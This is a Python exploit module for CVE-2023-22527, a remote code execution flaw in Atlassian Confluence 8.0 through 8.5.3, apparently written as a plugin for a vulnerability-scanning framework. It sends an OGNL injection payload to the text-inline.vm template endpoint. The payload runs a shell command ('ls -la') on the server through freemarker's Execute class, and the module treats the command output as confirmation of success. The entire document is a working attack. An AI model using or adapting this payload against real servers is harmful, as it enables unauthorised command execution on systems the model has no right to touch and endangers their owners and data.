# Exploit Title: CVE-2023-22527: Atlassian Confluence RCE Vulnerability
# Date: 25/1/2024
# Exploit Author: MaanVader
# Vendor Homepage: https://www.atlassian.com/software/confluence
# Software Link: https://www.atlassian.com/software/confluence
# Version:  8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, 8.5.0-8.5.3
# Tested on: 8.5.3
# CVE : CVE-2023-22527

import requests
from ....handler.retry.retryrequest import RetryRequest
from ...exploit import Exploit, CMS, Categorys
from ....config import Config

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

class Astl(Exploit):
    name = "Atlassian Confluence RCE"
    cms = CMS.NoCMS
    category = Categorys.RCE
    cve = "CVE-2023-22527"

    def run(self, url):
        payload = {
            'label': '\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027',
            'x': '@org.apache.struts2.ServletActionContext@getResponse().getWriter().write((new freemarker.template.utility.Execute()).exec({"ls -la"}))'
        }
        headers = {
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': CONFIG.useragent(),
            'Content-Length': str(len(payload))
        }

        r = retry_request.retry(requests.post, f"{url}/template/aui/text-inline.vm", timeout=CONFIG.timeouts(), headers=headers, allow_redirects=False, data=payload)
        
        if "rw-" in r.text:
            return True
        return False